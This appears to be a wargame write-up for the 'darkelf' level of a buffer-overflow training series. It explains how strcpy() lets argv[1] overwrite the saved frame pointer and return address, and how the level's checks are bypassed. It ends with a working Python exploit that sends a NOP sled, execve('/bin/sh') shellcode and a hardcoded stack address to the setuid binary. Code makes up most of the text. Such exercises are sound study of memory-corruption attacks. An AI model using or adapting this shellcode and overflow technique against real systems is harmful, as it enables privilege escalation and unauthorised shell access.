# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
The `darkelf` program uses strcpy() function to copy argv[1] to buffer's address.

But strcpy() doesn't check boundary so I can overwrite SFP & RET address.

There is a little protection code in `darkelf.c`:
```c
// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// check the length of argument
if(strlen(argv[1]) > 48){
  printf("argument is too long!\n");
  exit(0);
}

// buffer hunter
memset(buffer, 0, 40);
```

I will use argv[1]'s address into RET address since buffer will be set to zero.

The length check is added but this method doesn't care about it.

```
------------------------------------------------------------
| NOP(15) | SHELLCODE(25) | AAAA(4) | argv[1]'s address(4) |
------------------------------------------------------------
```

To know argv[1]'s address, get dump file:
```
0xbffffc10:	0x90909000	0x90909090	0x90909090	0x90909090
0xbffffc20:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xbffffc30:	0x31e18953	0xcd0bb0d2	0x41414180	0xffffff41
```

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA" # SFP
payload = payload + "\x14\xfc\xff\xbf" # RET

os.execv('/home/wolfman/darkelf', ["", payload])
```
